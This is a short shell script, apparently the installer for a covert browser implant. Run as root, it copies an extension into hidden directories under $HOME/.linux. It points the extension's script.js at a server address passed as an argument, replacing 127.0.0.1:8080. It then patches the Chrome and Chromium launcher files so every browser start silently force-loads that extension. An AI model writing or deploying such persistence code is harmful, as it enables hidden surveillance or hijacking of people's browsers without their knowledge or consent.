# need run this with root rights

# prepare directory for extension

if ! [ -d $HOME/.linux/ ]; then
	mkdir $HOME/.linux
fi

if ! [ -d $HOME/.linux/.chrome ]; then
	mkdir $HOME/.linux/.chrome
	mkdir $HOME/.linux/.chrome/backup
fi

if ! [ -d $HOME/.linux/.chromium ]; then
	mkdir $HOME/.linux/.chromium
	mkdir $HOME/.linux/.chromium/backup
fi

cp -r extension $HOME/.linux/.chrome/

if ! [ -z $1 ]; then
#set server-URL
	sed -i -- "s/127.0.0.1\:8080/$1/g" $HOME/.linux/.chrome/extension/script.js
fi 

# 1 chrome
if [ -f /opt/google/chrome/google-chrome ]; then
	# make backup
	cp -r /opt/google/chrome/google-chrome $HOME/.linux/.chrome/backup
	sed -i -- 's/--user-data-dir="\$CHROME_USER_DATA_DIR" "\$@"/--user-data-dir="\$CHROME_USER_DATA_DIR" "\$@" --load-extension=\$HOME\/.linux\/.chrome\/extension/g' /opt/google/chrome/google-chrome
	sed -i -- 's/exec -a "\$0" "$HERE\/chrome"  "\$@"/exec -a "$0" "\$HERE\/chrome"  "\$@" --load-extension=\$HOME\/.linux\/.chrome\/extension/g' /opt/google/chrome/google-chrome

fi
# 2 - chromium
if [ -f /usr/bin/chromium ]; then
	# make backup
	cp /usr/bin/chromium $HOME/.linux/.chromium/backup
	sed -i -- 's/exec \$LIBDIR\/\$APPNAME \$CHROMIUM_FLAGS "\$@"/exec \$LIBDIR\/\$APPNAME \$CHROMIUM_FLAGS "\$@" --load-extension=\$HOME\/.linux\/.chrome\/extension/g' /usr/bin/chromium
fi
